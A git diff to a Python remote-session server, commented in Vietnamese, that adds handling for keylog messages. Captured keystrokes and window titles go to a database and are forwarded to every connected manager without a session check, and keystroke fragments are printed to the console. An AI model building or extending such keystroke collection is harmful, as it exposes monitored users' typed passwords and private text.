@@ -19,7 +19,7 @@ from src.server.server_constants import (
     CMD_REGISTER, CMD_REGISTER_OK, 
     CMD_LIST_CLIENTS, CMD_CLIENT_LIST_UPDATE,
     CMD_CONNECT_CLIENT, CMD_SESSION_STARTED, CMD_SESSION_ENDED,
-    CMD_ERROR, CHANNEL_CONTROL
+    CMD_ERROR, CHANNEL_CONTROL, CHANNEL_INPUT
 )
 from src.server.core.auth_handler import (
     sign_in as auth_sign_in, 
@@ -30,6 +30,16 @@ from src.server.core.session import ServerSession
 
 from src.common.network.pdu_builder import PDUBuilder
 from src.common.network.mcs_layer import MCSLite
+
+# Import database cho keylog
+try:
+    from src.client.key_log.database import create_keystroke
+    KEYLOG_DB_AVAILABLE = True
+except ImportError:
+    print("[SessionManager] WARN: Keylog database module không khả dụng")
+    KEYLOG_DB_AVAILABLE = False
+    def create_keystroke(*args, **kwargs):
+        return False
 
 # Quản lý việc đăng ký (client/manager), xác thực User và điều phối các phiên (session).
 class SessionManager(threading.Thread):
@@ -53,6 +63,12 @@ class SessionManager(threading.Thread):
         self.pending_requests = {}  # { client_username: manager_id }
         
         self.lock = threading.Lock()
+
+    def _next_seq(self):
+        """Generate next sequence number"""
+        with self.lock:
+            self.seq += 1
+            return self.seq
 
     def start(self):
         self.running = True
@@ -122,6 +138,14 @@ class SessionManager(threading.Thread):
         - Nếu User đang rảnh -> Xử lý như lệnh Control (Login/Connect).
     """
     def handle_pdu(self, client_id, pdu):       
+        pdu_type = pdu.get("type")
+        
+        # Xử lý INPUT PDU (keylog) - LUÔN xử lý, không cần session
+        if pdu_type == "input":
+            self._handle_input_pdu(client_id, pdu)
+            return
+        
+        # Xử lý các loại PDU khác
         session = None
         with self.lock:
             session = self.client_session_map.get(client_id)
@@ -132,7 +156,8 @@ class SessionManager(threading.Thread):
         else:
             # User rảnh -> Đây là lệnh Control
             # Đẩy vào Queue để thread chính xử lý tuần tự, tránh race condition DB
-            self.pdu_queue.put((client_id, pdu))
+            if pdu_type == "control":
+                self.pdu_queue.put((client_id, pdu))
 
     # =========================================================================
     # VÒNG LẶP CHÍNH (XỬ LÝ CONTROL PDU)
@@ -326,7 +351,7 @@ class SessionManager(threading.Thread):
             for cid, role in self.clients.items():
                 # Điều kiện: Là client và chưa vào Session nào và đã login 
                 if role == ROLE_CLIENT and cid not in self.client_session_map:
-                    name = self.authenticated_users.get(cid, "Unknown")
+                    username = self.authenticated_users.get(cid, "Unknown")
                     # Lấy IP từ broadcaster
                     ip = "Unknown"
                     try:
@@ -336,7 +361,8 @@ class SessionManager(threading.Thread):
                     except Exception as e:
                         # Không lấy được IP thì thôi
                         pass
-                    available.append({"id": cid, "name": name, "ip": ip})
+                    # Dùng username làm 'id' để Manager có thể gửi CONNECT:username
+                    available.append({"id": username, "name": username, "ip": ip})
         return available
 
     # Gửi danh sách Client cho 1 Manager cụ thể
@@ -348,28 +374,71 @@ class SessionManager(threading.Thread):
     # Gửi danh sách Client cho tất cả Manager
     def _broadcast_client_list(self):
         data = self._get_available_clients()
+        print(f"[SessionManager] 📢 Broadcasting client list: {data}")  # DEBUG
         json_str = json.dumps(data)
         msg = f"{CMD_CLIENT_LIST_UPDATE}:{json_str}"
         
         with self.lock:
             managers = [cid for cid, role in self.clients.items() if role == ROLE_MANAGER]
         
+        print(f"[SessionManager] Sending to {len(managers)} manager(s): {managers}")  # DEBUG
         for mid in managers:
             self._send_control_pdu(mid, msg)
 
     # Helper để đóng gói và gửi tin nhắn Control
     def _send_control_pdu(self, target_id, message: str):
-        if not self.broadcaster: return
-        
-        # Nếu target đã mất kết nối thì thôi
-        with self.lock:
-            if target_id not in self.clients: return
-            self.seq += 1
-            current_seq = self.seq
-
+        seq = self._next_seq()
+        pdu_bytes = self.builder.build_control_pdu(seq, message.encode())
+        mcs_frame = MCSLite.build(CHANNEL_CONTROL, pdu_bytes)
+        self.broadcaster.enqueue(target_id, mcs_frame)  # Dùng enqueue, không phải send_to_client
+    
+    # [THÊM] Xử lý INPUT PDU (keylog) - Lưu DB và forward tới manager
+    def _handle_input_pdu(self, client_id, pdu):
+        """Xử lý keylog data từ client: lưu database và forward tới manager"""
         try:
-            pdu_bytes = self.builder.build_control_pdu(current_seq, message.encode("utf-8"))
-            mcs_frame = MCSLite.build(CHANNEL_CONTROL, pdu_bytes)
-            self.broadcaster.enqueue(target_id, mcs_frame)
+            input_data = pdu.get('input')
+            if not input_data or not isinstance(input_data, dict):
+                print(f"[SessionManager] INPUT PDU không hợp lệ từ {client_id}")
+                return
+            
+            # Lấy thông tin keylog
+            key_data = input_data.get('KeyData', '')
+            window_title = input_data.get('WindowTitle', 'Unknown')
+            client_username = input_data.get('ClientID', client_id)
+            logged_at = input_data.get('LoggedAt', '')
+            
+            print(f"[SessionManager] 📝 Keylog từ {client_username}: '{key_data[:20]}...' @ {window_title}")
+            
+            # 1. Lưu vào database
+            if KEYLOG_DB_AVAILABLE:
+                try:
+                    success = create_keystroke(key_data, window_title, client_username)
+                    if success:
+                        print(f"[SessionManager] ✅ Đã lưu keylog vào DB")
+                    else:
+                        print(f"[SessionManager] ⚠️ Không thể lưu keylog vào DB")
+                except Exception as db_err:
+                    print(f"[SessionManager] ❌ Lỗi DB: {db_err}")
+            
+            # 2. Forward tới tất cả Manager đang online
+            with self.lock:
+                managers = [cid for cid, role in self.clients.items() if role == ROLE_MANAGER]
+            
+            if managers:
+                # Rebuild INPUT PDU để gửi
+                raw_payload = pdu.get('_raw_payload')
+                if raw_payload:
+                    # Gửi raw PDU (đã có đầy đủ header)
+                    mcs_frame = MCSLite.build(CHANNEL_INPUT, raw_payload)
+                    for manager_id in managers:
+                        self.broadcaster.enqueue(manager_id, mcs_frame)  # Dùng enqueue
+                    print(f"[SessionManager] 📤 Đã forward keylog tới {len(managers)} manager(s)")
+                else:
+                    print(f"[SessionManager] ⚠️ Không có raw_payload để forward")
+            else:
+                print(f"[SessionManager] ℹ️ Không có manager online để nhận keylog")
+                
         except Exception as e:
-            print(f"[SessionManager] Send Error: {e}")
+            print(f"[SessionManager] ❌ Lỗi xử lý INPUT PDU: {e}")
+            import traceback
+            traceback.print_exc()
